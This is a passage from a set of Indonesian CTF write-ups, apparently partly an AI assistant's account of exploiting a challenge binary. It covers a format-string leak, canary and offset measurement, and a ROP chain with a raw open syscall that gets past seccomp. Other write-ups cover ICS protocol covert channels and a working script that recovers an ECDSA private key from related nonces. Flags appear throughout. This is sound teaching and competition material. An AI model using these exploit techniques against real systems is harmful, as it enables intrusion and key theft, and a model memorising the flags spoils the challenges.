skrip Python buat cari `size` yang memenuhi kedua syarat itu, lalu
langsung verifikasi lokal: kirim size ini + payload, cek proses nggak
nge-print pesan "ukuran ditolak" dan tetap alive nunggu overflow read.)*

## 4. Ngukur offset buffer → canary → return address

Dari disassembly `main()`:

    sub rsp, 0xe8          ; alokasi 232 byte, TANPA push register apapun sebelumnya
    ...
    mov [rsp+0xd8], canary ; canary disimpan di rsp+0xd8
    ...
    lea rsi, [rsp+0x90]    ; buffer overflow-able mulai di rsp+0x90

Jadi dari **awal buffer**: - offset `0x48` (=`0xd8-0x90`) → canary (8
byte) - offset `0x50` → 8 byte "gap" tak terpakai (karena nggak ada
`push` di prolog, jadi cuma padding alignment) - offset `0x58`
(=`0xe8-0x90`) → **return address**

Saya validasi ini secara empiris juga: kirim payload dengan canary yang
benar (dari leak) tapi return address `0x4141414141414141`, harusnya: -
**tidak** muncul pesan `*** stack smashing detected ***` (artinya canary
check lolos) - proses crash `SIGSEGV` pas coba eksekusi alamat
`0x4141...`

Hasilnya persis begitu → offset saya sudah benar 100%.

## 5. Nyusun ROP chain dan kenapa harus lewat libc

Karena RELRO full + PIE, target paling gampang adalah **ret2libc**:
panggil fungsi asli di libc (`open`, `read`, `write`, `exit`) lewat
gadget `pop reg; ret` buat ngatur argumen di `rdi`/`rsi`/`rdx`.

### Nyari gadget tanpa `ropper`/`gdb`

Sandbox saya nggak ada akses internet (nggak bisa
`pip install pwntools`/`ropper`/`apt install gdb`), jadi saya scan
gadget **manual pakai byte pattern** langsung di file `libc_so.6`:

``` python
pop rdi; ret  ->  bytes([0x5f, 0xc3])
pop rsi; ret  ->  bytes([0x5e, 0xc3])
pop rdx; ret  ->  bytes([0x5a, 0xc3])
pop rax; ret  ->  bytes([0x58, 0xc3])
syscall; ret  ->  bytes([0x0f, 0x05, 0xc3])
```

Cari semua kemunculan pattern itu di file, lalu saring yang jatuh di
**segmen executable** (r-x, offset file `0x28000`–`0x190000` sesuai
`/proc/maps`), lalu verifikasi tiap kandidat pakai
`objdump -d --start-address=... --stop-address=...` buat mastiin itu
benar instruksi valid bukan kebetulan potongan byte dari instruksi lain.

Alamat fungsi target (`open`, `read`, `write`, `exit`) saya ambil
langsung dari `nm -D libc.so.6`.

## 6. Percobaan pertama GAGAL (dan kenapa)

Chain awal saya:

    read(0, BSS, 16)                 # tulis nama file "flag.txt" ke .bss
    open(BSS, 0, 0)                  # panggil open() versi LIBC
    read(3, BSS, 0x100)              # asumsi fd hasil open = 3
    write(1, BSS, 0x100)             # cetak isi flag
    exit(0)

Saya tes lokal (`./ld.so --library-path . ./spiral`) **langsung
crash**, `poll()` proses = `-31` = **SIGSYS**. Itu sinyal khas kill dari
**seccomp**.

Saya cek ulang filter BPF di `main()` (didekode manual dari instruksi
`mov` yang nyusun struct `sock_filter` di stack): syscall yang di-allow
cuma **`open` (nr=2)**, BUKAN **`openat` (nr=257)`**.

Masalahnya: **`open()` versi glibc modern nggak lagi manggil syscall
`open` langsung** dari sekitar glibc 2.26+, wrapper `open()`
di-implementasikan lewat syscall `openat(AT_FDCWD, ...)`. Jadi walau
kita manggil fungsi bernama `open()`, di baliknya dia bikin syscall
nomor 257, yang **di-blok filter** → proses langsung di-`SIGSYS`-kill.

**Ini persis clue di soal**: *"Sandbox menutup satu pintu yang biasanya
terbuka"* pintu yang "biasanya terbuka" adalah `openat` (karena hampir
semua libc call file modern lewat situ), dan justru itu yang ditutup si
sandbox. Solusinya: jangan panggil `open()` dari libc, tapi **bikin
syscall `open` (nr 2) secara langsung/mentah** pakai gadget
`pop rax; ret` (isi nomor syscall) + `syscall; ret`.

## 7. Percobaan kedua fd di-hardcode, gagal lagi di remote

Fix pertama: ganti panggilan `open()` jadi raw syscall:

    pop rax, 2                  ; nomor syscall open()
    pop rdi, BSS                ; path
    pop rsi, 0                  ; flags O_RDONLY
    pop rdx, 0                  ; mode
    syscall; ret                 ; rax = fd

Lokal langsung sukses dapet isi `flag.txt` lokal saya. Tapi begitu
dicoba ke **server remote**, koneksi ke-`close` tanpa output apapun.

Penyebabnya: chain lanjutannya masih **hardcode `fd = 3`** buat
`read(fd, BSS, ...)`. Asumsi ini valid di test lokal saya (karena proses
cuma punya fd 0/1/2 dari pipe biasa), tapi **belum tentu valid di
server** `socat` dengan opsi `EXEC:...,stderr` bisa saja sudah pegang
fd tambahan sebelum exec, jadi fd hasil `open()` di server nggak pasti
persis 3.

## 8. Fix final ambil fd secara dinamis dari `rax`

Solusi: jangan tebak fd sama sekali. Setelah syscall `open` selesai,
`rax` **selalu** berisi fd (atau errno negatif kalau gagal) tinggal
pindahin ke `rdi` buat argumen `read()` berikutnya.

Saya cari gadget "pindah rax ke rdi" awalnya salah pilih opcode
(`0x93` yang saya kira `xchg eax,edi` ternyata itu `xchg eax,ebx`, bukan
`edi`!). Setelah dicek ulang tabel opcode x86, `xchg edi,eax` yang benar
itu **`0x97`**. Saya scan ulang, ketemu, verifikasi lewat test isolasi
kecil (`pop rdi=99; pop rax=7; xchg; exit()` → harus keluar exit-code 7
kalau gadgetnya bener) dan setelah pakai opcode yang benar, hasilnya
persis sesuai ekspektasi.

Chain final:

    read(0, BSS, 16)                         # user kirim "flag.txt\0" lewat socket
    pop rax=2; pop rdi=BSS; pop rsi=0; pop rdx=0; syscall   # raw open(BSS,O_RDONLY,0) -> rax=fd
    xchg edi, eax; ret                       # rdi = fd (BUKAN ditebak, diambil langsung dari hasil open)
    pop rsi=BSS; pop rdx=0x200; read()       # read(fd, BSS, 0x200) -> isi flag masuk BSS
    pop rdi=1; pop rsi=BSS; pop rdx=0x200; write()  # write(1, BSS, 0x200) -> flag ke-print ke socket
    pop rdi=0; exit()

Saya validasi ulang secara lokal end-to-end (leak → overflow → ROP →
dapet isi `flag.txt` lokal saya balik lewat socket) baru saya kasih ke
kamu sebagai `exploit_spiral.py` versi terakhir.

## 9. Kenapa saya bisa "yakin" tanpa akses ke server remote

Semua nomor ajaib di script final (`0x8224a`, `0x14c5`, alamat gadget,
alamat fungsi, offset `.bss`) **bukan hasil hafalan atau tebakan** —
semuanya diukur langsung dari **file `spiral`, `libc_so.6`,
`ld-linux-x86-64_so.2` yang kamu upload**, dengan cara:

1.  Disassembly manual (`objdump`) buat ngerti alur program & struct
    seccomp filter.
2.  Jalanin binary **secara lokal** di sandbox saya pakai loader & libc
    yang sama persis (karena `Dockerfile` bilang loader/libc di-pin,
    jadi identik dengan server).
3.  Setiap klaim (offset leak, offset canary/return address, validitas
    gadget, perilaku seccomp) **saya buktikan dengan eksperimen kecil
    dan terisolasi** dulu sebelum dipakai di chain besar makanya
    begitu ada yang salah (asumsi fd=3, opcode xchg keliru), saya bisa
    cepat nemuin akar masalahnya lewat proses eliminasi, bukan nebak
    ulang dari nol.

Karena binary+libc+loader remote **identik** dengan yang saya test lokal
(sesuai desain soal makanya file-file itu sengaja dikasih ke peserta),
semua offset itu seharusnya transfer 1:1 ke server satu-satunya bagian
yang beda cuma **base address** (ASLR), dan itu justru yang di-leak dulu
di step paling awal sebelum ROP chain dikirim.

## Ringkasan alur akhir

    leak (%21$p/%27$p/%29$p)  →  hitung libc_base & pie_base & dapet canary exact
       → kirim size=4097 (bypass buggy check)
       → kirim payload: filler + canary asli + filler + ROP chain
       → ROP: baca nama file dari socket → RAW SYSCALL open (bukan libc open!) 
            → ambil fd dari rax → read isi file → write ke socket
       → flag muncul di output

03 / ICS · OT

WU-006 · 50 pts

# PLC Konveyor

ICS / OT

**Flag:** `REDLIMIT{s7_d4t4bl0ck_1nt_4rr4y_symb0l_p4rs3}`

**File:** `project.s7p` (681 byte, dump project PLC Siemens S7)

### Struktur file (garis besar)

File ini berisi beberapa **block** (ditandai magic bytes `S7B`), semacam
"folder" berisi kode program (`OB1`) dan data (data block "resep" untuk
konveyor: kecepatan, suhu, batch ID, dst).

### Ada 2 hal yang kelihatan seperti flag tapi cuma 1 yang asli

**A. Decoy (jebakan) di komentar/note blok OB1**

Kalau kamu buka file ini pakai `strings project.s7p` biasa (tool paling
umum buat nyari teks di file biner), langsung ketemu:

    REDLIMIT{db9_str1ng_1s_th3_d3c0y}

String ini eksplisit bilang sendiri dia "decoy" sengaja ditaro sebagai
plain ASCII biar gampang ditemukan `strings`, biar orang mikir "oh udah
ketemu nih" dan berhenti nyari.

**B. Flag asli disembunyikan di data block resep, field `recipe_sig`**

Ini bagian yang perlu "dicurigai" kenapa? Karena kalau kamu jalanin
`strings` biasa di area field `recipe_sig`, **gak akan kelihatan**
teksnya! Ini bukti-nya (hex mentah persis di sekitar field
`recipe_sig`):

    0f b5 0a 72 65 63 69 70 65 5f 73 69 67 05 00 5a 00
    52 00 45 00 44 00 4c 00 49 00 4d 00 49 00 54 00 7b 00
    73 00 37 00 5f 00 64 00 34 00 74 00 34 00 62 00 6c 00
    30 00 63 00 6b 00 5f 00 31 00 6e 00 74 00 5f 00 ...

Coba perhatiin: `72 65 63 69 70 65 5f 73 69 67` itu tulisan
`"recipe_sig"` (nama field-nya, normal ASCII). Tapi setelah header field
(`05 00` = tipe, `5a` = panjang data = 90 byte), datanya berpola:
**`00 XX 00 XX 00 XX ...`** ada byte `0x00` nyempil di antara tiap
karakter!

**Kenapa ini bikin `strings` gagal nemuin?** Karena `strings` default
cuma nyari teks ASCII biasa (1 byte per karakter, berurutan tanpa
selingan `0x00`). Di sini, tiap karakter itu ditulis pake **2 byte
(UTF-16 big-endian)** jadi huruf `R` ditulis sebagai `00 52` bukan
cuma `52`. Ini trik klasik nyembunyiin teks dari tool pencarian string
yang "males" istilahnya **wide-string encoding** dipakai buat
obfuscation.

**Decode manual (ambil tiap pasangan `00 XX`, convert byte kedua ke
ASCII):**

    00 52 → R    00 45 → E    00 44 → D    00 4c → L    00 49 → I
    00 4d → M    00 49 → I    00 54 → T    00 7b → {    00 73 → s
    00 37 → 7    00 5f → _    00 64 → d    00 34 → 4    00 74 → t
    ... dst sampai byte 00 7d → }

### Flag

    REDLIMIT{s7_d4t4bl0ck_1nt_4rr4y_symb0l_p4rs3}

### Kenapa ini "masuk akal" sebagai teknik nyata?

Di dunia ICS/SCADA asli, data block PLC memang bisa nyimpen array data
dalam berbagai tipe (integer 16-bit, string, dll). Kalau ada
insider/attacker mau nyelipin data rahasia di project PLC tanpa ketauan
audit `strings` biasa, nyimpennya sebagai array integer 16-bit (yang
"kebetulan" jadi UTF-16 kalau dibaca sebagai teks) adalah cara yang
cukup realistis buat lolos dari pengecekan dangkal.

---

## Ringkasan Pola (berlaku untuk kedua soal ICS/OT di atas)

| Clue                                                                                                  | Artinya                                                                                                                       |
|-------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------|
| Command/field yang **berulang dengan pola nilai naik/berubah teratur** (IOA naik 1 per perintah)      | Kemungkinan tiap "unit" data nyimpen 1 potongan kecil dari pesan yang lebih besar (byte/karakter)                             |
| String yang ketemu gampang banget & isinya **menyebut dirinya sendiri** ("decoy", "not the real one") | Curigai biasanya emang sengaja jadi umpan                                                                                   |
| Ada byte `0x00` **berselang-seling** dengan byte lain yang "kayak ASCII"                              | Coba baca sebagai UTF-16 (LE atau BE), bukan ASCII biasa `strings -e l` (little-endian) atau manual decode kalau big-endian |
| Field dengan panjang data yang "terlalu besar" dibanding tipe yang diharapkan                         | Cek isinya beneran mungkin bukan single value, tapi array/string tersembunyi                                                |

WU-007 · 50 pts

# Gardu 104

ICS / OT

**Flag:** `REDLIMIT{i3c104_sc4l3d_s3tp01nt_c_se_nb_c0mm4nd}`

**File:** `gardu.iec104` (2422 byte, capture mentah protokol SCADA)

### Apa itu IEC 104, singkatnya

Ini protokol yang dipakai buat komunikasi antara operator (control
center) dengan alat di gardu listrik (RTU/substation) misalnya buat
baca sensor atau kirim perintah kontrol. Setiap "paket" disebut
**APDU**, selalu diawali byte `0x68`, diikuti 1 byte panjang, lalu isi
datanya (**ASDU**).

Di dalam ASDU ada field **TypeID** yang menentukan "ini paket jenis apa"
misalnya: - TypeID `13` = kiriman data sensor (measurement) - TypeID
`49` (`0x31`) = **perintah set-point** dari operator ke alat (ubah suatu
nilai), jenis `C_SE_NB_1` (nilai integer 16-bit)

### Cara nemuin flag-nya step by step

**Step 1 Parse semua APDU.** Saya scan file byte-per-byte, cari tiap
`0x68`, baca 1 byte setelahnya sebagai panjang frame, lalu potong
frame-nya. Ketemu 135 frame total.

**Step 2 Filter yang menarik.** Dari 135 frame itu, difilter yang
TypeID = `49` (perintah set-point) dan COT (Cause of Transmission) = `6`
(artinya "activation" operator betulan lagi ngirim perintah, bukan
cuma monitoring).

**Step 3 Lihat pola nilainya.** Ini bagian kuncinya. Setiap perintah
itu isinya: alamat tujuan (IOA) + **nilai 2-byte** yang mau di-set. Nah,
nilai-nilai itu, kalau di-convert ke ASCII, ternyata membentuk huruf!

**Buktinya (raw hex, 3 frame pertama):**

    frame[3]: 68 10 02 00 00 00 31 01 06 00 0a 00 00 40 00 52 00 80
    frame[5]: 68 10 06 00 00 00 31 01 06 00 0a 00 01 40 00 45 00 80
    frame[8]: 68 10 0c 00 00 00 31 01 06 00 0a 00 02 40 00 44 00 80

Potongan pentingnya ada di 2 byte sebelum byte terakhir (`80`): -
frame[3] → `52 00` → nilai desimal **82** → ASCII **`R`** - frame[5]
→ `45 00` → nilai desimal **69** → ASCII **`E`** - frame[8] → `44 00`
→ nilai desimal **68** → ASCII **`D`**

Kebayang kan? R-E-D... itu awal dari `REDLIMIT`. Kalau semua ±44
perintah semacam ini diurutkan (urutannya ketauan dari IOA yang naik
terus: `00 40 00`, `01 40 00`, `02 40 00`, ...) dan tiap nilainya
dikonversi ke huruf, hasilnya membentuk kalimat penuh.

**Analoginya:** bayangin operator "ngetik" flag itu satu huruf per baris
perintah, nyelundupinnya lewat command yang sah-sah aja secara protokol
(perintah set-point emang normal ada di IEC104), cuma nilainya sengaja
dipilih = kode ASCII huruf demi huruf. Ini disebut **covert channel** —
nyimpen data di tempat yang "sah" tapi gak akan dicurigai orang yang
cuma ngecek fungsionalitas normalnya.

### Flag

    REDLIMIT{i3c104_sc4l3d_s3tp01nt_c_se_nb_c0mm4nd}

---

WU-008 · 50 pts

# Instalasi Air

ICS / OT

**Flag:** `REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}`

**Apa yang diberikan?** File `.mbtcp` rekaman lalu lintas jaringan
**Modbus/TCP**, yaitu protokol komunikasi yang dipakai di industri
(pabrik, PLTA, instalasi air) buat mengontrol mesin/PLC. Ceritanya: ada
penyerang yang nyelundupin data ke dalam trafik "obrolan normal" antara
operator (SCADA) dan mesin (PLC).

**Apa maksudnya?** Modbus itu kayak protokol chat sederhana antar mesin:
ada perintah "tulis nilai X ke slot Y". Kalau penyerang nulis nilai
aneh-aneh ke banyak slot secara berurutan, itu bisa jadi cara
nyembunyiin pesan rahasia mirip nulis pesan pakai kode Morse lewat
lampu sein mobil.

**Bukti (PoC) perintah "tulis" mencurigakan yang saya temukan**
(fungsi Modbus `0x10` = "Write Multiple Registers", beda dari perintah
baca normal `0x03` yang dipakai SCADA):

| Alamat slot | Data mentah yang ditulis |
|-------------|--------------------------|
| `0x100`     | `ERLDMITI`               |
| `0x104`     | `m{d0ub_s`               |
| `0x108`     | `cf61r_g3`               |
| `0x10c`     | `s13t_r`                 |
| `0x10f`     | `yb3t0_dr`               |
| `0x113`     | `r3r_c3n0`               |
| `0x117`     | `}`                      |

Kalau digabung urut, hasilnya kacau: `ERLDMITIm{d0ub_scf61r_g3...` —
belum kebaca.

**Kuncinya:** setiap 2 karakter itu **posisinya kebalik** (byte-swap) —
ini kesalahan klasik di dunia industri, di mana urutan byte
"besar-ke-kecil vs kecil-ke-besar" beda antar perangkat (mirip nulis
tanggal `31/12` vs `12/31` sama-sama benar tapi beda urutan). Contoh:
`"ER"` dibalik jadi `"RE"`, `"LD"` dibalik jadi `"DL"` → `ERLD` jadi
`REDL`.

Setelah semua pasangan dibalik dan digabung:

    REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}

### ✅ Flag: `REDLIMIT{m0dbus_fc16_r3g1st3r_byt3_0rd3r_r3c0n}`

---

04 / CRYPTO

WU-009 · 50 pts

# Sandi Garuda

Crypto Hard

**Flag:** `REDLIMIT{r3kur3nsi_n0nc3_kuadr4t1k_di_4t4s_kurva_garuda}`

## Deskripsi Challenge

    Sistem Sandi Garuda: HSM penandatangan nasional menandatangani beberapa nota
    dinas dengan ECDSA (secp256k1). Demi efisiensi entropi, HSM tidak mengambil
    nonce yang benar-benar baru dan acak setiap kali. Kamu mendapat transkrip
    beberapa tanda tangan dan sepotong kata rahasia. Pelajari cara HSM
    menghasilkannya, lalu bongkar kuncinya.

File yang diberikan: `chall.py` (source generator) dan `output.txt`
(hasil run: kurva, public key `Q`, 6 pasang tanda tangan, serta
ciphertext flag AES-GCM).

## 1. Analisis Source

Bagian paling penting dari `chall.py` adalah cara nonce `k`
dibangkitkan:

``` python
c = int.from_bytes(os.urandom(32), "big") % N
k = int.from_bytes(os.urandom(32), "big") % N
...
for msg in MESSAGES:
    while True:
        R = ec_mul(k, G); r = R[0] % N; z = H(msg)
        if r != 0:
            s = (inv(k, N) * (z + r * d)) % N
            if s != 0: break
        k = (k * k + c) % N
    sigs.append((msg, r, s))
    k = (k * k + c) % N          # <-- nonce round berikutnya
```

`k` **bukan** nonce acak baru tiap pesan melainkan hasil rekurensi
kuadratik:

$$k_{i+1} = k_i^2 + c \pmod n$$

dengan `c` konstan (dan rahasia) sepanjang seluruh proses. Nonce awal
`k_0` juga rahasia. Ini adalah pelanggaran klasik syarat ECDSA: setiap
nonce harus independen & acak. Karena nonce-nonce berikutnya
*deterministik* terhadap nonce sebelumnya (via `c` yang tetap), kita
bisa membangun relasi aljabar antar signature untuk mengekstrak private
key `d`.

Setelah `d` didapat, flag dienkripsi dengan:

``` python
key = hashlib.sha256(b"garuda-hsm-key||" + d.to_bytes(32, "big")).digest()
cipher = AES.new(key, AES.MODE_GCM, nonce=b"garuda-iv-01")
```

jadi begitu `d` diketahui, dekripsi AES-GCM langsung.

## 2. Membangun Relasi Matematis

Dari persamaan tanda tangan ECDSA standar:

$$s_i \cdot k_i \equiv z_i + r_i \cdot d \pmod n$$

maka setiap nonce bisa ditulis **linear** terhadap private key `d`:

$$k_i = a_i + b_i \cdot d, \qquad a_i = z_i \cdot s_i^{-1} \bmod n,\\
\\ b_i = r_i \cdot s_i^{-1} \bmod n$$

Karena `c` konstan di setiap langkah rekurensi, untuk tiga signature
berurutan $i, i{+}1, i{+}2$ berlaku:

$$k_{i+1} - k_i^2 = c = k_{i+2} - k_{i+1}^2 \pmod n$$

Substitusi $k_i = a_i + b_i d$ ke persamaan ini menghasilkan
**persamaan kuadratik tunggal dalam `d`** (karena $k_i^2$ memunculkan
suku $d^2$):

$$(a_{i+1} - a_i^2) + (b_{i+1} - 2a_i b_i)\\d - b_i^2\\d^2 \\=\\
(a_{i+2} - a_{i+1}^2) + (b_{i+2} - 2a_{i+1} b_{i+1})\\d -
b_{i+1}^2\\d^2$$

Semua koefisien bisa dihitung langsung dari data yang diberikan
(`r_i, s_i, z_i`). Karena orde kurva `n` (secp256k1) adalah bilangan
**prima**, persamaan kuadratik `A·d² + B·d + C ≡ 0 (mod n)` bisa
diselesaikan dengan rumus kuadrat memakai modular square root
(Tonelli–Shanks):

$$d = \frac{-B \pm \sqrt{B^2 - 4AC} \bmod n}{2A} \bmod n$$

Menghasilkan (paling banyak) 2 kandidat `d`. Kandidat yang benar
diverifikasi dengan mengecek $d \cdot G \stackrel{?}{=} Q$ (public key
yang diberikan di `output.txt`).

## 3. Proof of Concept (Solve Script)

``` python
#!/usr/bin/env python3
import hashlib
import sympy
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ---- parameter kurva secp256k1 ----
P  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
N  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8

def inv(a, m): return pow(a, -1, m)

def ec_add(A, B):
    if A is None: return B
    if B is None: return A
    x1, y1 = A; x2, y2 = B
    if x1 == x2 and (y1 + y2) % P == 0: return None
    m = (3*x1*x1) * inv(2*y1, P) % P if A == B else (y2-y1) * inv((x2-x1) % P, P) % P
    x3 = (m*m - x1 - x2) % P
    return (x3, (m*(x1-x3) - y1) % P)

def ec_mul(k, Pt):
    R = None
    while k:
        if k & 1: R = ec_add(R, Pt)
        Pt = ec_add(Pt, Pt); k >>= 1
    return R

G = (Gx, Gy)
def H(msg): return int.from_bytes(hashlib.sha256(msg).digest(), "big") % N

# ---- data dari output.txt ----
Q = (13985740631445150908282103409624931946214541181127923398690562794836743616483,
     41321383050925624504591487003694903167451545873032808070662850472023741723882)

signatures = [
    (b'NOTA-DINAS/2026: distribusi kunci sesi antar-kementerian', 46752234261513192236545380823020101290759414097186611730532647124807219360018, 24685780213893309477579288960164871197895950235246616398062484333986099308339),
    (b'NOTA-DINAS/2026: rotasi sertifikat gerbang identitas nasional', 24860196877078012319222937633633835539629977286561966777009654354029925559878, 50884852546083740374029546391364116716523060662255318724118463180564393839912),
    (b'NOTA-DINAS/2026: pengesahan manifest firmware HSM Garuda', 93234099586464203218287468218981869172068073395356498491027333298698493997437, 106082075668013620494094122199844826893078136132910908766318376379741382072275),
    (b'NOTA-DINAS/2026: audit berkala modul tanda tangan pusat', 81392982404112786773520094157198450901171754615651917008599033390941499219583, 454564433788400623596136929012626278253051272737949142185161239532098665442),
    (b'NOTA-DINAS/2026: sinkronisasi waktu tepercaya wilayah barat', 99792122142768970933116264589141175304828500095546517569056953025932682139716, 108206432707793948995684089890963206851889876385789530874638240235445773888984),
    (b'NOTA-DINAS/2026: pencabutan token layanan pihak ketiga', 39183624655849147087337364005252505658477224339633872602999188818394959858938, 2450643005678137014932331421736277881634603695000815307558859517345227863397),
]

z = [H(m) for m, r, s in signatures]
r = [t[1] for t in signatures]
s = [t[2] for t in signatures]

# k_i = a_i + b_i*d
a = [z[i] * inv(s[i], N) % N for i in range(6)]
b = [r[i] * inv(s[i], N) % N for i in range(6)]

d = sympy.symbols('d')

def diff_eq(i):
    k0 = a[i]   + b[i]   * d
    k1 = a[i+1] + b[i+1] * d
    k2 = a[i+2] + b[i+2] * d
    # (k1 - k0^2) - (k2 - k1^2) = 0  (mod N)   <-- c dieliminasi
    return sympy.expand((k1 - k0**2) - (k2 - k1**2))

poly = sympy.Poly(diff_eq(0), d)
A, B, C = [int(c) % N for c in poly.all_coeffs()]     # A*d^2 + B*d + C = 0 (mod N)

disc = (B*B - 4*A*C) % N
roots = sympy.sqrt_mod(disc, N, all_roots=True)
inv2A = inv(2*A, N)

for root in roots:
    d_cand = ((-B + root) * inv2A) % N
    if ec_mul(d_cand, G) == Q:                        # verifikasi terhadap public key
        d_priv = d_cand
        break

print("private key d =", d_priv)

# ---- dekripsi flag ----
key   = hashlib.sha256(b"garuda-hsm-key||" + d_priv.to_bytes(32, "big")).digest()
nonce = bytes.fromhex("6761727564612d69762d3031")
ct    = bytes.fromhex("539fe0be0756851554da58701b6ffde991b82479fc54f3c871a0915424921e0c5f1ce14ff3af6728cffe542f66fbb18f51409cee706f8915")
tag   = bytes.fromhex("25f73ff544b224e4025715496add4583")

flag = AESGCM(key).decrypt(nonce, ct + tag, None)
print(flag.decode())
```

### Output ketika dijalankan

    private key d = 109923268815731126562074169284855939904621437966834660532775057567280443175155
    REDLIMIT{r3kur3nsi_n0nc3_kuadr4t1k_di_4t4s_kurva_garuda}

## 4. Ringkasan Alur Serangan

| Langkah | Aksi                                                                                                             |
|---------|------------------------------------------------------------------------------------------------------------------|
| 1       | Identifikasi bug: nonce `k` mengikuti rekurensi `k_{i+1}=k_i²+c mod n`, bukan acak murni                         |
| 2       | Nyatakan tiap nonce `k_i` sebagai fungsi linear dari private key `d` lewat persamaan signature `s·k=z+r·d`       |
| 3       | Eliminasi konstanta `c` yang tak diketahui memakai 3 signature berurutan → persamaan kuadratik tunggal dalam `d` |
| 4       | Selesaikan kuadratik mod `n` (prima) dengan akar kuadrat modular (Tonelli–Shanks) → maksimal 2 kandidat `d`      |
| 5       | Verifikasi kandidat lewat `d·G = Q`                                                                              |
| 6       | Turunkan kunci AES (`SHA256("garuda-hsm-key||"+d)`) dan dekripsi `flag_ct`/`flag_tag` dengan AES-GCM             |

**Flag: `REDLIMIT{r3kur3nsi_n0nc3_kuadr4t1k_di_4t4s_kurva_garuda}`**

## Catatan Mitigasi

Nonce ECDSA harus benar-benar acak dan independen setiap penandatanganan
(RFC 6979 merekomendasikan nonce deterministik yang diturunkan dari hash
pesan + private key, bukan dari nonce sebelumnya). Rekurensi apa pun
yang membuat nonce saling bergantung secara aljabar sekecil apa pun —
membuka celah untuk merekonstruksi private key lewat sistem persamaan
seperti di atas.

WU-010 · 50 pts

# Overcooked

Crypto Medium

**Flag:** `REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}`

**Apa yang diberikan?** File teks berisi Base64, dan petunjuk: *"Koki
kami memasak pesan ini berkali-kali menggunakan resep berlapis... kupas
setiap hidangannya dari akhir untuk menemukan rasa aslinya."*

**Apa maksudnya?** Sama seperti soal nomor 1, ini soal **banyak lapis
encoding** bedanya di sini lapisannya **beda jenis-jenis**, bukan
Base64 semua. Ibaratnya bungkus kado di dalam kotak, di dalam kertas
koran, di dalam kantong plastik tiap lapis beda bahan, harus dibuka
satu-satu dengan cara yang beda-beda juga.

**Bukti (PoC) 4 lapis yang saya temukan, urut dari luar ke dalam:**

**Lapis 1 (terluar): Base64.** Setelah di-decode, muncul baris-baris
aneh seperti ini:

    ----- .---- .---- ----- ----- .---- .---- .----

**Lapis 2: Kode Morse untuk angka.** Ternyata tiap kelompok 5 simbol
(titik/strip) itu adalah **kode Morse buat angka 0-9** (contoh: `-----`
= angka `0`, `.----` = angka `1`, dst ini kode Morse yang biasa
dipakai buat radio/telegraf jaman dulu). Setelah semua kelompok
diterjemahkan jadi angka, hasilnya cuma angka **0 dan 1** saja artinya
ini sebenarnya data **biner** (bahasa komputer paling dasar) yang
"disamarkan" pakai kode Morse.

**Lapis 3: Biner → Teks.** Angka 0/1 tadi dikelompokkan per 8 digit (1
byte = 1 karakter), hasilnya teks aneh seperti ini:

    ga eh eg fe fb ff fb gc `ab ``_ cg hd ``d ef ...

**Lapis 4 (terdalam): Kode angka rahasia.** Perhatikan, huruf yang
muncul cuma 10 macam: `_` `` ` `` `a` `b` `c` `d` `e` `f` `g` `h` pas
10 karakter, kayak digit 0-9! Ternyata memang itu maksudnya: `_`=0,
`` ` ``=1, `a`=2, `b`=3, ..., `h`=9. Tiap "kata" (dipisah spasi) adalah
**kode ASCII desimal** (kode angka standar buat 1 huruf) yang
disamarkan.

Contoh: kata `ga` → `g`=8, `a`=2 → jadi angka **"82"** → kode ASCII 82 =
huruf **`R`**. Kata `eh` → `e`=6,`h`=9 → **"69"** → huruf **`E`**. Kata
`eg` → **"68"** → **`D`**. Begitu seterusnya dan memang kalau
diteruskan hasilnya persis **`R-E-D-L-I-M-I-T`**! ✔️

Setelah semua kata di-translate:

    REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}

### ✅ Flag: `REDLIMIT{n0_sCr1pt_n33d3d_no_41_sl0p_}`

---

WU-011 · 50 pts

# 4xJump Shell

Crypto

**Flag:** `REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}`

**Apa yang diberikan?** Satu blok teks acak panjang, plus petunjuk:
*"Lompat 4 kali tiap hari, membuat kerang menjadi lebih kuat! hanya
kerang-kerang kuat yang bisa melakukannya."*

**Apa maksudnya?** Ini kode teka-teki. "Lompat 4 kali" = **decode Base64
sebanyak 4 kali berturut-turut**. Base64 itu cara ngubah data jadi teks
yang aman dikirim lewat email/chat (contoh: `SGVsbG8=` kalau di-decode
jadi `Hello`). Di sini, hasil decode pertama itu Base64 lagi, decode
lagi hasilnya Base64 lagi, sampai 4 lapis makanya di soal dibilang
"kerang jadi lebih kuat" (tiap lapis nambah "kekuatan"/obfuscation).

**Bukti (PoC) apa yang saya lihat di tiap lapis:**

Lapis 1-3 hasilnya masih Base64 (ga penting isinya), tapi **lapis ke-4**
hasilnya beda bukan Base64 lagi, tapi kode **PowerShell** asli:

``` powershell
"OhRVrEoiDgRL5IILBMbfIoGTbJ{TPjIAUCLmZ3pWZ_SB1rjn9Wtgf0gw_wMtZchDI3_7_fJp1O043wKm3ecroXsf2h3g3rDl1xlxw_Qrw7R0eMrkIlpkdyr}OSJoR"[2,5,8,11,14,17,...]-join""
```

Ini adalah trik **array indexing** di PowerShell: ambil karakter dari
string panjang itu, tapi cuma di posisi ke-2, 5, 8, 11, 14, ... (loncat
3 tiap kali, mulai dari indeks ke-2) lalu digabung jadi satu string
baru. Jadi string panjang itu adalah "sampah" yang isinya flag-nya
sendiri, tapi diacak dan cuma karakter di posisi tertentu yang
membentuk flag aslinya (sisanya cuma pengecoh).

**Cara solve:** saya ambil karakter di indeks-indeks itu pakai Python,
gabungkan hasilnya.

    Hasil gabungan karakter di posisi 2,5,8,11,... :
    REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}

### ✅ Flag: `REDLIMIT{jUmp_1nt0_th3_p0w3rsh3ll_w0rld}`

---

05 / MISC · BLOCKCHAIN

WU-012 · 150 pts

# Geprek Chain

Misc / Blockchain Medium

